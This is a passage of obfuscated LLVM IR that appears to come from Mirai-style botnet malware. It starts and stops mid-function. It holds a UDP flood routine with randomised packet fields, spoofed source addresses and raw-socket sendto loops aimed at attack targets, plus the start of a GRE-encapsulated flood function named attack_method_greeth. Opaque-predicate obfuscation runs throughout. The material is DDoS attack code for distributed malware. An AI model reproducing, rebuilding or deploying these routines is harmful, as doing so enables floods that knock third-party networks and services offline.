  br i1 %428, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %420
  %429 = call i32 @rand_next()
  %430 = and i32 %429, 65535
  %431 = trunc i32 %430 to i16
  %432 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %433 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %432, i32 0, i32 3
  store i16 %431, i16* %433, align 4
  %434 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %435 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %434, i32 0, i32 3
  %436 = load i16, i16* %435, align 4
  %437 = zext i16 %436 to i32
  %438 = sub nsw i32 %437, 1000
  %439 = xor i32 %438, -1
  %440 = trunc i32 %439 to i16
  %441 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %442 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %441, i32 0, i32 3
  store i16 %440, i16* %442, align 4
  %443 = load i32, i32* @x.25
  %444 = load i32, i32* @y.26
  %445 = sub i32 %443, 1
  %446 = mul i32 %443, %445
  %447 = urem i32 %446, 2
  %448 = icmp eq i32 %447, 0
  %449 = icmp slt i32 %444, 10
  %450 = or i1 %448, %449
  br i1 %450, label %originalBBpart239, label %originalBB26alteredBB

originalBBpart239:                                ; preds = %originalBB26
  br label %451

; <label>:451:                                    ; preds = %originalBBpart239, %416
  %452 = load i16, i16* %16, align 2
  %453 = zext i16 %452 to i32
  %454 = icmp eq i32 %453, 65535
  br i1 %454, label %455, label %477

; <label>:455:                                    ; preds = %451
  %456 = load i32, i32* @x.25
  %457 = load i32, i32* @y.26
  %458 = sub i32 %456, 1
  %459 = mul i32 %456, %458
  %460 = urem i32 %459, 2
  %461 = icmp eq i32 %460, 0
  %462 = icmp slt i32 %457, 10
  %463 = or i1 %461, %462
  br i1 %463, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %455
  %464 = call i32 @rand_next()
  %465 = and i32 %464, 65535
  %466 = trunc i32 %465 to i16
  %467 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %468 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %467, i32 0, i32 0
  store i16 %466, i16* %468, align 2
  %469 = load i32, i32* @x.25
  %470 = load i32, i32* @y.26
  %471 = sub i32 %469, 1
  %472 = mul i32 %469, %471
  %473 = urem i32 %472, 2
  %474 = icmp eq i32 %473, 0
  %475 = icmp slt i32 %470, 10
  %476 = or i1 %474, %475
  br i1 %476, label %originalBBpart249, label %originalBB41alteredBB

originalBBpart249:                                ; preds = %originalBB41
  br label %477

; <label>:477:                                    ; preds = %originalBBpart249, %451
  %478 = load i16, i16* %17, align 2
  %479 = zext i16 %478 to i32
  %480 = icmp eq i32 %479, 65535
  br i1 %480, label %481, label %487

; <label>:481:                                    ; preds = %477
  %482 = call i32 @rand_next()
  %483 = and i32 %482, 65535
  %484 = trunc i32 %483 to i16
  %485 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %486 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %485, i32 0, i32 1
  store i16 %484, i16* %486, align 2
  br label %487

; <label>:487:                                    ; preds = %481, %477
  %488 = load i32, i32* @x.25
  %489 = load i32, i32* @y.26
  %490 = sub i32 %488, 1
  %491 = mul i32 %488, %490
  %492 = urem i32 %491, 2
  %493 = icmp eq i32 %492, 0
  %494 = icmp slt i32 %489, 10
  %495 = or i1 %493, %494
  br i1 %495, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %487
  %496 = load i8, i8* %20, align 1
  %497 = icmp ne i8 %496, 0
  %498 = load i32, i32* @x.25
  %499 = load i32, i32* @y.26
  %500 = sub i32 %498, 1
  %501 = mul i32 %498, %500
  %502 = urem i32 %501, 2
  %503 = icmp eq i32 %502, 0
  %504 = icmp slt i32 %499, 10
  %505 = or i1 %503, %504
  br i1 %505, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  br i1 %497, label %526, label %506

; <label>:506:                                    ; preds = %originalBBpart253
  %507 = load i32, i32* @x.25
  %508 = load i32, i32* @y.26
  %509 = sub i32 %507, 1
  %510 = mul i32 %507, %509
  %511 = urem i32 %510, 2
  %512 = icmp eq i32 %511, 0
  %513 = icmp slt i32 %508, 10
  %514 = or i1 %512, %513
  br i1 %514, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %506
  %515 = call i32 @rand_next()
  %516 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %517 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %516, i32 0, i32 9
  store i32 %515, i32* %517, align 4
  %518 = load i32, i32* @x.25
  %519 = load i32, i32* @y.26
  %520 = sub i32 %518, 1
  %521 = mul i32 %518, %520
  %522 = urem i32 %521, 2
  %523 = icmp eq i32 %522, 0
  %524 = icmp slt i32 %519, 10
  %525 = or i1 %523, %524
  br i1 %525, label %originalBBpart257, label %originalBB55alteredBB

originalBBpart257:                                ; preds = %originalBB55
  br label %532

; <label>:526:                                    ; preds = %originalBBpart253
  %527 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %528 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %527, i32 0, i32 9
  %529 = load i32, i32* %528, align 4
  %530 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %531 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %530, i32 0, i32 9
  store i32 %529, i32* %531, align 4
  br label %532

; <label>:532:                                    ; preds = %526, %originalBBpart257
  %533 = load i8, i8* %19, align 1
  %534 = icmp ne i8 %533, 0
  br i1 %534, label %535, label %538

; <label>:535:                                    ; preds = %532
  %536 = load i8*, i8** %31, align 8
  %537 = load i32, i32* %18, align 4
  call void @rand_str(i8* %536, i32 %537)
  br label %538

; <label>:538:                                    ; preds = %535, %532
  %539 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %540 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %539, i32 0, i32 7
  store i16 0, i16* %540, align 2
  %541 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %542 = bitcast %struct.iphdr* %541 to i16*
  %543 = call zeroext i16 @checksum_generic(i16* %542, i32 20)
  %544 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %545 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %544, i32 0, i32 7
  store i16 %543, i16* %545, align 2
  %546 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %547 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %546, i32 0, i32 7
  store i16 0, i16* %547, align 2
  %548 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %549 = bitcast %struct.iphdr* %548 to i16*
  %550 = call zeroext i16 @checksum_generic(i16* %549, i32 20)
  %551 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %552 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %551, i32 0, i32 7
  store i16 %550, i16* %552, align 2
  %553 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %554 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %553, i32 0, i32 3
  store i16 0, i16* %554, align 2
  %555 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %556 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %557 = bitcast %struct.udphdr* %556 to i8*
  %558 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %559 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %558, i32 0, i32 2
  %560 = load i16, i16* %559, align 2
  %561 = load i32, i32* %18, align 4
  %562 = sext i32 %561 to i64
  %563 = add i64 8, %562
  %564 = trunc i64 %563 to i32
  %565 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %555, i8* %557, i16 zeroext %560, i32 %564)
  %566 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %567 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %566, i32 0, i32 3
  store i16 %565, i16* %567, align 2
  %568 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %569 = load i32, i32* %9, align 4
  %570 = sext i32 %569 to i64
  %571 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %568, i64 %570
  %572 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %571, i32 0, i32 0
  %573 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %572, i32 0, i32 0
  store i16 2, i16* %573, align 4
  %574 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %575 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %574, i32 0, i32 9
  %576 = load i32, i32* %575, align 4
  %577 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %578 = load i32, i32* %9, align 4
  %579 = sext i32 %578 to i64
  %580 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %577, i64 %579
  %581 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %580, i32 0, i32 0
  %582 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %581, i32 0, i32 2
  %583 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %582, i32 0, i32 0
  store i32 %576, i32* %583, align 4
  %584 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %585 = load i32, i32* %9, align 4
  %586 = sext i32 %585 to i64
  %587 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %584, i64 %586
  %588 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %587, i32 0, i32 0
  %589 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %588, i32 0, i32 1
  store i16 0, i16* %589, align 2
  %590 = load i32, i32* %10, align 4
  %591 = load i8*, i8** %26, align 8
  %592 = load i32, i32* %18, align 4
  %593 = sext i32 %592 to i64
  %594 = add i64 52, %593
  %595 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %596 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %597 = load i32, i32* %9, align 4
  %598 = sext i32 %597 to i64
  %599 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %596, i64 %598
  %600 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %599, i32 0, i32 0
  %601 = bitcast %struct.sockaddr_in* %600 to %struct.sockaddr*
  store %struct.sockaddr* %601, %struct.sockaddr** %595, align 8
  %602 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %603 = load %struct.sockaddr*, %struct.sockaddr** %602, align 8
  %604 = call i64 @sendto(i32 %590, i8* %591, i64 %594, i32 16384, %struct.sockaddr* %603, i32 16)
  br label %605

; <label>:605:                                    ; preds = %538
  %606 = load i32, i32* %9, align 4
  %607 = add nsw i32 %606, 1
  store i32 %607, i32* %9, align 4
  br label %323

; <label>:608:                                    ; preds = %originalBBpart220
  %609 = load i32, i32* @x.25
  %610 = load i32, i32* @y.26
  %611 = sub i32 %609, 1
  %612 = mul i32 %609, %611
  %613 = urem i32 %612, 2
  %614 = icmp eq i32 %613, 0
  %615 = icmp slt i32 %610, 10
  %616 = or i1 %614, %615
  br i1 %616, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %608
  %617 = load i32, i32* @x.25
  %618 = load i32, i32* @y.26
  %619 = sub i32 %617, 1
  %620 = mul i32 %617, %619
  %621 = urem i32 %620, 2
  %622 = icmp eq i32 %621, 0
  %623 = icmp slt i32 %618, 10
  %624 = or i1 %622, %623
  br i1 %624, label %originalBBpart261, label %originalBB59alteredBB

originalBBpart261:                                ; preds = %originalBB59
  br label %306

; <label>:625:                                    ; preds = %116, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %78
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %95
  store i32 1, i32* %9, align 4
  %626 = load i32, i32* %10, align 4
  %627 = bitcast i32* %9 to i8*
  %628 = call i32 @setsockopt(i32 %626, i32 0, i32 3, i8* %627, i32 4) #6
  %629 = icmp eq i32 %628, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %175
  %630 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %631 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %632 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %631, i32 0, i32 4
  store i16 %630, i16* %632, align 2
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %289
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %306
  store i32 0, i32* %9, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %323
  %633 = load i32, i32* %9, align 4
  %634 = load i8, i8* %5, align 1
  %635 = zext i8 %634 to i32
  %636 = icmp slt i32 %633, %635
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %393
  %637 = load i32, i32* %21, align 4
  %638 = icmp eq i32 %637, -1
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %420
  %639 = call i32 @rand_next()
  %_ = shl i32 %639, 65535
  %_27 = sub i32 0, %639
  %gen = add i32 %_27, 65535
  %_28 = sub i32 %639, 65535
  %gen29 = mul i32 %_28, 65535
  %640 = and i32 %639, 65535
  %641 = trunc i32 %640 to i16
  %642 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %643 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %642, i32 0, i32 3
  store i16 %641, i16* %643, align 4
  %644 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %645 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %644, i32 0, i32 3
  %646 = load i16, i16* %645, align 4
  %647 = zext i16 %646 to i32
  %_30 = shl i32 %647, 1000
  %_31 = sub i32 0, %647
  %gen32 = add i32 %_31, 1000
  %648 = sub nsw i32 %647, 1000
  %_33 = sub i32 0, %648
  %gen34 = add i32 %_33, -1
  %_35 = shl i32 %648, -1
  %_36 = sub i32 %648, -1
  %gen37 = mul i32 %_36, -1
  %649 = xor i32 %648, -1
  %650 = trunc i32 %649 to i16
  %651 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %652 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %651, i32 0, i32 3
  store i16 %650, i16* %652, align 4
  br label %originalBB26

originalBB41alteredBB:                            ; preds = %originalBB41, %455
  %653 = call i32 @rand_next()
  %_42 = sub i32 %653, 65535
  %gen43 = mul i32 %_42, 65535
  %_44 = sub i32 %653, 65535
  %gen45 = mul i32 %_44, 65535
  %_46 = sub i32 %653, 65535
  %gen47 = mul i32 %_46, 65535
  %654 = and i32 %653, 65535
  %655 = trunc i32 %654 to i16
  %656 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %657 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %656, i32 0, i32 0
  store i16 %655, i16* %657, align 2
  br label %originalBB41

originalBB51alteredBB:                            ; preds = %originalBB51, %487
  %658 = load i8, i8* %20, align 1
  %659 = icmp ne i8 %658, 0
  br label %originalBB51

originalBB55alteredBB:                            ; preds = %originalBB55, %506
  %660 = call i32 @rand_next()
  %661 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %662 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %661, i32 0, i32 9
  store i32 %660, i32* %662, align 4
  br label %originalBB55

originalBB59alteredBB:                            ; preds = %originalBB59, %608
  br label %originalBB59
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greeth(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.ethhdr*, align 8
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.grehdr*, align 8
  %33 = alloca %struct.ethhdr*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.udphdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %41 = load i8, i8* %5, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %11, align 8
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %12, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %13, align 2
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %14, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 1)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %15, align 1
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %16, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 65535)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %17, align 2
  %69 = load i8, i8* %7, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 0, i32 1458)
  store i32 %71, i32* %18, align 4
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 1, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %19, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 19, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %20, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = load i32, i32* @LOCAL_ADDR, align 4
  %83 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 25, i32 %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %10, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %103

; <label>:86:                                     ; preds = %4
  %87 = load i32, i32* @x.27
  %88 = load i32, i32* @y.28
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %86
  %95 = load i32, i32* @x.27
  %96 = load i32, i32* @y.28
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %600

; <label>:103:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %104 = load i32, i32* %10, align 4
  %105 = bitcast i32* %9 to i8*
  %106 = call i32 @setsockopt(i32 %104, i32 0, i32 3, i8* %105, i32 4) #6
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %111

; <label>:108:                                    ; preds = %103
  %109 = load i32, i32* %10, align 4
  %110 = call i32 @close(i32 %109)
  br label %600

; <label>:111:                                    ; preds = %103
  %112 = load i32, i32* @x.27
  %113 = load i32, i32* @y.28
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %111
  store i32 0, i32* %9, align 4
  %120 = load i32, i32* @x.27
  %121 = load i32, i32* @y.28
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %128

; <label>:128:                                    ; preds = %316, %originalBBpart24
  %129 = load i32, i32* %9, align 4
  %130 = load i8, i8* %5, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp slt i32 %129, %131
  br i1 %132, label %133, label %319

; <label>:133:                                    ; preds = %128
  %134 = load i32, i32* @x.27
  %135 = load i32, i32* @y.28
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %133
  %142 = call noalias i8* @calloc(i64 1458, i64 8) #6
  %143 = load i8**, i8*** %11, align 8
  %144 = load i32, i32* %9, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds i8*, i8** %143, i64 %145
  store i8* %142, i8** %146, align 8
  %147 = load i8**, i8*** %11, align 8
  %148 = load i32, i32* %9, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds i8*, i8** %147, i64 %149
  %151 = load i8*, i8** %150, align 8
  %152 = bitcast i8* %151 to %struct.iphdr*
  store %struct.iphdr* %152, %struct.iphdr** %22, align 8
  %153 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i64 1
  %155 = bitcast %struct.iphdr* %154 to %struct.grehdr*
  store %struct.grehdr* %155, %struct.grehdr** %23, align 8
  %156 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %157 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %156, i64 1
  %158 = bitcast %struct.grehdr* %157 to %struct.ethhdr*
  store %struct.ethhdr* %158, %struct.ethhdr** %24, align 8
  %159 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %160 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %159, i64 1
  %161 = bitcast %struct.ethhdr* %160 to %struct.iphdr*
  store %struct.iphdr* %161, %struct.iphdr** %25, align 8
  %162 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i64 1
  %164 = bitcast %struct.iphdr* %163 to %struct.udphdr*
  store %struct.udphdr* %164, %struct.udphdr** %26, align 8
  %165 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %166 = bitcast %struct.iphdr* %165 to i8*
  %167 = load i8, i8* %166, align 4
  %168 = and i8 %167, 15
  %169 = or i8 %168, 64
  store i8 %169, i8* %166, align 4
  %170 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %171 = bitcast %struct.iphdr* %170 to i8*
  %172 = load i8, i8* %171, align 4
  %173 = and i8 %172, -16
  %174 = or i8 %173, 5
  store i8 %174, i8* %171, align 4
  %175 = load i8, i8* %12, align 1
  %176 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 1
  store i8 %175, i8* %177, align 1
  %178 = load i32, i32* %18, align 4
  %179 = sext i32 %178 to i64
  %180 = add i64 66, %179
  %181 = trunc i64 %180 to i16
  %182 = call zeroext i16 @htons(i16 zeroext %181) #7
  %183 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i32 0, i32 2
  store i16 %182, i16* %184, align 2
  %185 = load i16, i16* %13, align 2
  %186 = call zeroext i16 @htons(i16 zeroext %185) #7
  %187 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %188 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %187, i32 0, i32 3
  store i16 %186, i16* %188, align 4
  %189 = load i8, i8* %14, align 1
  %190 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 5
  store i8 %189, i8* %191, align 4
  %192 = load i8, i8* %15, align 1
  %193 = icmp ne i8 %192, 0
  %194 = load i32, i32* @x.27
  %195 = load i32, i32* @y.28
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBBpart237, label %originalBB6alteredBB

originalBBpart237:                                ; preds = %originalBB6
  br i1 %193, label %202, label %206

; <label>:202:                                    ; preds = %originalBBpart237
  %203 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %204 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 4
  store i16 %203, i16* %205, align 2
  br label %206

; <label>:206:                                    ; preds = %202, %originalBBpart237
  %207 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 6
  store i8 47, i8* %208, align 1
  %209 = load i32, i32* %21, align 4
  %210 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %211 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %210, i32 0, i32 8
  store i32 %209, i32* %211, align 4
  %212 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %213 = load i32, i32* %9, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %212, i64 %214
  %216 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %215, i32 0, i32 1
  %217 = load i32, i32* %216, align 4
  %218 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 9
  store i32 %217, i32* %219, align 4
  %220 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %221 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %222 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %221, i32 0, i32 1
  store i16 %220, i16* %222, align 2
  %223 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %224 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %225 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %224, i32 0, i32 2
  store i16 %223, i16* %225, align 1
  %226 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %227 = bitcast %struct.iphdr* %226 to i8*
  %228 = load i8, i8* %227, align 4
  %229 = and i8 %228, 15
  %230 = or i8 %229, 64
  store i8 %230, i8* %227, align 4
  %231 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %232 = bitcast %struct.iphdr* %231 to i8*
  %233 = load i8, i8* %232, align 4
  %234 = and i8 %233, -16
  %235 = or i8 %234, 5
  store i8 %235, i8* %232, align 4
  %236 = load i8, i8* %12, align 1
  %237 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %238 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %237, i32 0, i32 1
  store i8 %236, i8* %238, align 1
  %239 = load i32, i32* %18, align 4
  %240 = sext i32 %239 to i64
  %241 = add i64 28, %240
  %242 = trunc i64 %241 to i16
  %243 = call zeroext i16 @htons(i16 zeroext %242) #7
  %244 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %245 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %244, i32 0, i32 2
  store i16 %243, i16* %245, align 2
  %246 = load i16, i16* %13, align 2
  %247 = zext i16 %246 to i32
  %248 = xor i32 %247, -1
